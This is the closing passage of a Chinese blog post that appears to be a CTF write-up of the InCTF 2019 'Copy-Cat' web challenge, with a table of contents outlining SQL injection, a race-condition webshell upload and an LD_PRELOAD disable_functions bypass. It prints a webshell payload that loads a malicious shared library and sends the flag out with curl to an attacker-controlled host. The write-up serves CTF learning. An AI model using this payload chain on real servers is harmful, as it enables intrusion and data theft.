+<h6 id="php-payload"><a href="#php-payload" class="headerlink" title="php payload"></a>php payload</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uploads/youngsin/webshell.php?0=putenv(&quot;LD_PRELOAD=/tmp/evil.so&quot;);putenv(&quot;youngsin=curl http://my_ip:9996/ -d id=`/readFlag|base64|tr -d &apos;\n&apos;`&quot;);mb_send_mail(&quot;a&quot;,&quot;a&quot;,&quot;a&quot;);</span><br></pre></td></tr></table></figure>
+
+<h6 id="执行payload后，你将会在你的服务器日志中获取flag。"><a href="#执行payload后，你将会在你的服务器日志中获取flag。" class="headerlink" title="执行payload后，你将会在你的服务器日志中获取flag。"></a>执行payload后，你将会在你的服务器日志中获取flag。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag = inctf&#123;Ohh,you_are_the_ultimate_chainer,Bypassing_disable_function_wasn&apos;t_fun?:SpyD3r&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><h6 id="https-www-php-net-manual-en-mbstring-installation-php"><a href="#https-www-php-net-manual-en-mbstring-installation-php" class="headerlink" title="https://www.php.net/manual/en/mbstring.installation.php"></a><a href="https://www.php.net/manual/en/mbstring.installation.php" target="_blank" rel="noopener">https://www.php.net/manual/en/mbstring.installation.php</a></h6><h6 id="https-www-php-net-manual-en-function-mb-send-mail-php"><a href="#https-www-php-net-manual-en-function-mb-send-mail-php" class="headerlink" title="https://www.php.net/manual/en/function.mb-send-mail.php"></a><a href="https://www.php.net/manual/en/function.mb-send-mail.php" target="_blank" rel="noopener">https://www.php.net/manual/en/function.mb-send-mail.php</a></h6><h6 id="https-www-cnblogs-com-hookjoy-p-10167315-html"><a href="#https-www-cnblogs-com-hookjoy-p-10167315-html" class="headerlink" title="https://www.cnblogs.com/hookjoy/p/10167315.html"></a><a href="https://www.cnblogs.com/hookjoy/p/10167315.html" target="_blank" rel="noopener">https://www.cnblogs.com/hookjoy/p/10167315.html</a></h6><h6 id="https-www-cnblogs-com-net66-p-5609026-html"><a href="#https-www-cnblogs-com-net66-p-5609026-html" class="headerlink" title="https://www.cnblogs.com/net66/p/5609026.html"></a><a href="https://www.cnblogs.com/net66/p/5609026.html" target="_blank" rel="noopener">https://www.cnblogs.com/net66/p/5609026.html</a></h6><h6 id="https-wooyun-js-org-drops-E5-88-A9-E7-94-A8-E7-8E-AF-E5-A2-83-E5-8F-98-E9-87-8FLD-PRELOAD-E6-9D-A5-E7-BB-95-E8-BF-87php-20disable-function-E6-89-A7-E8-A1-8C-E7-B3-BB-E7-BB-9F-E5-91-BD-E4-BB-A4-html"><a href="#https-wooyun-js-org-drops-E5-88-A9-E7-94-A8-E7-8E-AF-E5-A2-83-E5-8F-98-E9-87-8FLD-PRELOAD-E6-9D-A5-E7-BB-95-E8-BF-87php-20disable-function-E6-89-A7-E8-A1-8C-E7-B3-BB-E7-BB-9F-E5-91-BD-E4-BB-A4-html" class="headerlink" title="https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FLD_PRELOAD%E6%9D%A5%E7%BB%95%E8%BF%87php%20disable_function%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4.html"></a><a href="https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FLD_PRELOAD%E6%9D%A5%E7%BB%95%E8%BF%87php%20disable_function%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FLD_PRELOAD%E6%9D%A5%E7%BB%95%E8%BF%87php%20disable_function%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4.html</a></h6><h6 id="https-blog-bi0s-in-2019-10-16-Web-inctfi19-web-writeups"><a href="#https-blog-bi0s-in-2019-10-16-Web-inctfi19-web-writeups" class="headerlink" title="https://blog.bi0s.in/2019/10/16/Web/inctfi19-web-writeups/"></a><a href="https://blog.bi0s.in/2019/10/16/Web/inctfi19-web-writeups/" target="_blank" rel="noopener">https://blog.bi0s.in/2019/10/16/Web/inctfi19-web-writeups/</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/24/2019-redhat-ctf的Apache-Solr构造回显/" rel="next" title="2019 redhat ctf的Apache Solr构造回显">
+                <i class="fa fa-chevron-left"></i> 2019 redhat ctf的Apache Solr构造回显
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#题目难度还是很大的最后只有4个队伍完成了这个挑战。"><span class="nav-number">1.0.1.</span> <span class="nav-text">题目难度还是很大的最后只有4个队伍完成了这个挑战。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#题目分析"><span class="nav-number">1.0.2.</span> <span class="nav-text">题目分析</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#题目的源代码：Copy-Cat-zip"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">题目的源代码：Copy-Cat.zip</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这是一个白盒测试，提供了完整的源代码。下面是进入这个挑战的首页面，你将会看到一个简单的登陆功能："><span class="nav-number">1.0.2.2.</span> <span class="nav-text">这是一个白盒测试，提供了完整的源代码。下面是进入这个挑战的首页面，你将会看到一个简单的登陆功能：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果你分析下载的代码的话，你将会看到用户的账户名和密码通过了下面的验证。"><span class="nav-number">1.0.2.3.</span> <span class="nav-text">如果你分析下载的代码的话，你将会看到用户的账户名和密码通过了下面的验证。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#login-php"><span class="nav-number">1.0.2.4.</span> <span class="nav-text">login.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以看到通过用check对输入的username和password进行过滤。"><span class="nav-number">1.0.2.5.</span> <span class="nav-text">可以看到通过用check对输入的username和password进行过滤。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们随后跟进check函数，这个函数函数的功能是首先使用real-escape-string函数将用户输入的特殊符号给转义成完全的字符如-quot-39-等，然后还要检查长度值。"><span class="nav-number">1.0.2.6.</span> <span class="nav-text">我们随后跟进check函数，这个函数函数的功能是首先使用real_escape_string函数将用户输入的特殊符号给转义成完全的字符如(&quot;,&#39;,\)等，然后还要检查长度值。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#functions-php"><span class="nav-number">1.0.2.7.</span> <span class="nav-text">functions.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过仔细的观察上面的代码，我们可以看到如果用户的输入值长度大于11个字符，则可以通过substr截断输入的值，结合上面提到的read-escape-string函数，这将给我们提供了SQL注入的可能。"><span class="nav-number">1.0.2.8.</span> <span class="nav-text">通过仔细的观察上面的代码，我们可以看到如果用户的输入值长度大于11个字符，则可以通过substr截断输入的值，结合上面提到的read_escape_string函数，这将给我们提供了SQL注入的可能。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#利用的方式如下："><span class="nav-number">1.0.2.9.</span> <span class="nav-text">利用的方式如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们使用下面的代码实验一波："><span class="nav-number">1.0.2.10.</span> <span class="nav-text">我们使用下面的代码实验一波：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最终的结果："><span class="nav-number">1.0.2.11.</span> <span class="nav-text">最终的结果：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现在我们可以绕过第一步成功的登陆，但是登陆后，你跳转到admin-php页面将会显示Sorry-It-seems-you-are-not-Admin…are-you-If-yes-proove-it-then-。"><span class="nav-number">1.0.2.12.</span> <span class="nav-text">现在我们可以绕过第一步成功的登陆，但是登陆后，你跳转到admin.php页面将会显示Sorry, It seems you are not Admin…are you? If yes, proove it then !!。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现在我们开始阅读functions下面的源代码找到如下的位置："><span class="nav-number">1.0.2.13.</span> <span class="nav-text">现在我们开始阅读functions下面的源代码找到如下的位置：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这段代码显示了怎样判断用户是admin的。"><span class="nav-number">1.0.2.14.</span> <span class="nav-text">这段代码显示了怎样判断用户是admin的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现在我们要看它在哪里设置了成为admin跟进到remote-admin-php。"><span class="nav-number">1.0.2.15.</span> <span class="nav-text">现在我们要看它在哪里设置了成为admin跟进到remote_admin.php。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过分析代码，我们可以看到仅当通过-SERVER-quot-REMOTE-ADDR-quot-访问改页面的IP为127-0-0-1时，会话中的admin值才设置为True。因此我们要用127-0-0-1来覆盖-SERVER-quot-HTTP-I-AM-ADMIN-quot-的值，并通过调用create-function创建函数来实现。"><span class="nav-number">1.0.2.16.</span> <span class="nav-text">通过分析代码，我们可以看到仅当通过$_SERVER[&quot;REMOTE_ADDR&quot;]访问改页面的IP为127.0.0.1时，会话中的admin值才设置为True。因此我们要用127.0.0.1来覆盖$_SERVER[&quot;HTTP_I_AM_ADMIN&quot;]的值，并通过调用create_function创建函数来实现。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是你会发现上面的那个函数没有办法调用，因为你要构造一个admin-random-bin2hex-openssl-random-pseudo-bytes-32-的函数，然后通过-GET-39-random-39-传入来调用，但是那个-random是随机的你没有办法预测。"><span class="nav-number">1.0.2.17.</span> <span class="nav-text">但是你会发现上面的那个函数没有办法调用，因为你要构造一个admin_+$random = bin2hex(openssl_random_pseudo_bytes(32));的函数，然后通过$_GET[&#39;random&#39;]();传入来调用，但是那个$random是随机的你没有办法预测。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#然后我们google了几个小时找到了关于create-function注入的相关知识。"><span class="nav-number">1.0.2.18.</span> <span class="nav-text">然后我们google了几个小时找到了关于create_function注入的相关知识。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#大家可以阅读这两篇博客："><span class="nav-number">1.0.2.19.</span> <span class="nav-text">大家可以阅读这两篇博客：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PHP-create-function-代码注入"><span class="nav-number">1.0.2.20.</span> <span class="nav-text">PHP create_function()代码注入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#create-function函数如何实现RCE"><span class="nav-number">1.0.2.21.</span> <span class="nav-text">create_function函数如何实现RCE</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后阅读通过阅读php的create-function源代码解决了这个问题。"><span class="nav-number">1.0.2.22.</span> <span class="nav-text">最后阅读通过阅读php的create_function源代码解决了这个问题。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#zend-builtin-function-c"><span class="nav-number">1.0.2.23.</span> <span class="nav-text">zend_builtin_function.c</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面的源代码中，我们可以看到create-function函数的返回值为-x00lambda-d，并且实际的本地测试显示匿名函数最终以-x00lambda-1-x00lambda-2等字符串形式返回。"><span class="nav-number">1.0.2.24.</span> <span class="nav-text">上面的源代码中，我们可以看到create_function函数的返回值为\x00lambda_%d，并且实际的本地测试显示匿名函数最终以\x00lambda_1,\x00lambda_2等字符串形式返回。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#然后回到上面的代码，我们可以预测-remote-admin变量中匿名函数的字符串名称值，以便我们可以调用匿名函数来获取管理员的权限，而无需直接调用admin-random-函数。"><span class="nav-number">1.0.2.25.</span> <span class="nav-text">然后回到上面的代码，我们可以预测$remote_admin变量中匿名函数的字符串名称值，以便我们可以调用匿名函数来获取管理员的权限，而无需直接调用admin_$random()函数。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#绕过的payload如下："><span class="nav-number">1.0.2.26.</span> <span class="nav-text">绕过的payload如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现在，获得管理员权限后，如果我们再次访问admin-php页面你可以看到有一个上传功能。"><span class="nav-number">1.0.2.27.</span> <span class="nav-text">现在，获得管理员权限后，如果我们再次访问admin.php页面你可以看到有一个上传功能。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上传功能的代码如下："><span class="nav-number">1.0.2.28.</span> <span class="nav-text">上传功能的代码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#upload-php"><span class="nav-number">1.0.2.29.</span> <span class="nav-text">upload.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#functions-php-1"><span class="nav-number">1.0.2.30.</span> <span class="nav-text">functions.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#代码的流程如下："><span class="nav-number">1.0.2.31.</span> <span class="nav-text">代码的流程如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#解压缩上传的Zip文件到-uploads-md5-hex-value-目录下，并且将会验证上传的文件后缀来判断是否要删除文件。"><span class="nav-number">1.0.2.32.</span> <span class="nav-text">解压缩上传的Zip文件到./uploads/md5_hex_value/目录下，并且将会验证上传的文件后缀来判断是否要删除文件。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是上传的文件是先保存后在删除的，因此我们可以用条件竞争的方式来getshell。"><span class="nav-number">1.0.2.33.</span> <span class="nav-text">但是上传的文件是先保存后在删除的，因此我们可以用条件竞争的方式来getshell。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#youngsin-php-将此文件压缩成youngsin-zip"><span class="nav-number">1.0.2.34.</span> <span class="nav-text">youngsin.php(将此文件压缩成youngsin.zip)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#raceCondition-py"><span class="nav-number">1.0.2.35.</span> <span class="nav-text">raceCondition.py</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下："><span class="nav-number">1.0.2.36.</span> <span class="nav-text">结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果你访问生成的webshell，你将看到webshell已经正常上传。"><span class="nav-number">1.0.2.37.</span> <span class="nav-text">如果你访问生成的webshell，你将看到webshell已经正常上传。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#现在，我们已经成功的上传了webshell，但是我们还是不能去读取flag存在的文件因为这个文件只有执行的权限，因此我们并不能通过简单的file-Function来获取。"><span class="nav-number">1.0.2.38.</span> <span class="nav-text">现在，我们已经成功的上传了webshell，但是我们还是不能去读取flag存在的文件因为这个文件只有执行的权限，因此我们并不能通过简单的file Function来获取。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通过phpinfo-我们可以看到，disable-functions的设置如下："><span class="nav-number">1.0.2.39.</span> <span class="nav-text">通过phpinfo()我们可以看到，disable_functions的设置如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#disable-functions"><span class="nav-number">1.0.2.40.</span> <span class="nav-text">disable_functions</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#基本上，我们可以看到php中所有有关shell的函数都被禁用了，但是禁用函数列表没有禁用putenv，因此我们可以使用LD-PRELOAD来突破disable-functions来执行系统命令。"><span class="nav-number">1.0.2.41.</span> <span class="nav-text">基本上，我们可以看到php中所有有关shell的函数都被禁用了，但是禁用函数列表没有禁用putenv，因此我们可以使用LD_PRELOAD来突破disable_functions来执行系统命令。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#LD-PRELOAD为我们提供了劫持系统函数的能力，但是前提是我们要控制php启动外部程序才行-只要有进程启动行为即可-，我们常用的启动一个新进程的方法有mail-imap-open-error-log-syslog和imagick-没有安装此模块-，其内部原理都是通过execve来开启一个新的进程。"><span class="nav-number">1.0.2.42.</span> <span class="nav-text">LD_PRELOAD为我们提供了劫持系统函数的能力，但是前提是我们要控制php启动外部程序才行(只要有进程启动行为即可)，我们常用的启动一个新进程的方法有mail,imap_open,error_log,syslog和imagick(没有安装此模块)，其内部原理都是通过execve来开启一个新的进程。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是禁用函数列表全部把我们可以用的函数全部给禁用了现在我们就要看看php安装了哪些可以用的模块。"><span class="nav-number">1.0.2.43.</span> <span class="nav-text">但是禁用函数列表全部把我们可以用的函数全部给禁用了现在我们就要看看php安装了哪些可以用的模块。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们最后在phpinfo中看到了一个名为mbstring的扩展模块。"><span class="nav-number">1.0.2.44.</span> <span class="nav-text">我们最后在phpinfo中看到了一个名为mbstring的扩展模块。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果安装了该模块，则可以使用Multibyte-character-encoding的功能，其中的mb-send-mail函数的功能可以替代mail，并且达到相同的效果，如下所示："><span class="nav-number">1.0.2.45.</span> <span class="nav-text">如果安装了该模块，则可以使用Multibyte character encoding的功能，其中的mb_send_mail函数的功能可以替代mail，并且达到相同的效果，如下所示：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对于这个函数，由于它除了编码部分其余与mail函数一样，因此通过execve进行sendmail调用是在内部进行的，并且不应用disable-function，因此我们可以通过使用LD-PRELOAD来劫持系统函数，执行系统命令。"><span class="nav-number">1.0.2.46.</span> <span class="nav-text">对于这个函数，由于它除了编码部分其余与mail函数一样，因此通过execve进行sendmail调用是在内部进行的，并且不应用disable_function，因此我们可以通过使用LD_PRELOAD来劫持系统函数，执行系统命令。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面简要介绍一下LD-PRELOAD怎样劫持系统函数。"><span class="nav-number">1.0.2.47.</span> <span class="nav-text">下面简要介绍一下LD_PRELOAD怎样劫持系统函数。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-创建一个覆盖execve的共享库-例如：gcc-shared-fPIC-evil-c-o-evil-so"><span class="nav-number">1.0.2.48.</span> <span class="nav-text">1. 创建一个覆盖execve的共享库(例如：gcc -shared -fPIC evil.c -o evil.so)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-上传-so文件。"><span class="nav-number">1.0.2.49.</span> <span class="nav-text">2. 上传.so文件。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-通过使用php的putenv来设置LD-PRELOAD，让我们的动态链接程序被优先调用。"><span class="nav-number">1.0.2.50.</span> <span class="nav-text">3. 通过使用php的putenv来设置LD_PRELOAD，让我们的动态链接程序被优先调用。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#4-调用一个函数-例如：mail-imap-open-error-log等-，该函数在php内部调用execve。"><span class="nav-number">1.0.2.51.</span> <span class="nav-text">4. 调用一个函数(例如：mail,imap_open,error_log等)，该函数在php内部调用execve。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如果你对这项技术感到好奇，你可以通过google搜索关键字如php-ld-preload-bypass来详细的了解。"><span class="nav-number">1.0.2.52.</span> <span class="nav-text">如果你对这项技术感到好奇，你可以通过google搜索关键字如php ld_preload bypass来详细的了解。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#执行上述过程的代码如下："><span class="nav-number">1.0.2.53.</span> <span class="nav-text">执行上述过程的代码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#evil-c"><span class="nav-number">1.0.2.54.</span> <span class="nav-text">evil.c</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#php-payload"><span class="nav-number">1.0.2.55.</span> <span class="nav-text">php payload</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#执行payload后，你将会在你的服务器日志中获取flag。"><span class="nav-number">1.0.2.56.</span> <span class="nav-text">执行payload后，你将会在你的服务器日志中获取flag。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考资料"><span class="nav-number">1.0.3.</span> <span class="nav-text">参考资料</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-php-net-manual-en-mbstring-installation-php"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">https://www.php.net/manual/en/mbstring.installation.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-php-net-manual-en-function-mb-send-mail-php"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">https://www.php.net/manual/en/function.mb-send-mail.php</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-cnblogs-com-hookjoy-p-10167315-html"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">https://www.cnblogs.com/hookjoy/p/10167315.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-cnblogs-com-net66-p-5609026-html"><span class="nav-number">1.0.3.4.</span> <span class="nav-text">https://www.cnblogs.com/net66/p/5609026.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-wooyun-js-org-drops-E5-88-A9-E7-94-A8-E7-8E-AF-E5-A2-83-E5-8F-98-E9-87-8FLD-PRELOAD-E6-9D-A5-E7-BB-95-E8-BF-87php-20disable-function-E6-89-A7-E8-A1-8C-E7-B3-BB-E7-BB-9F-E5-91-BD-E4-BB-A4-html"><span class="nav-number">1.0.3.5.</span> <span class="nav-text">https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FLD_PRELOAD%E6%9D%A5%E7%BB%95%E8%BF%87php%20disable_function%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4.html</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-blog-bi0s-in-2019-10-16-Web-inctfi19-web-writeups"><span class="nav-number">1.0.3.6.</span> <span class="nav-text">https://blog.bi0s.in/2019/10/16/Web/inctfi19-web-writeups/</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">72.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
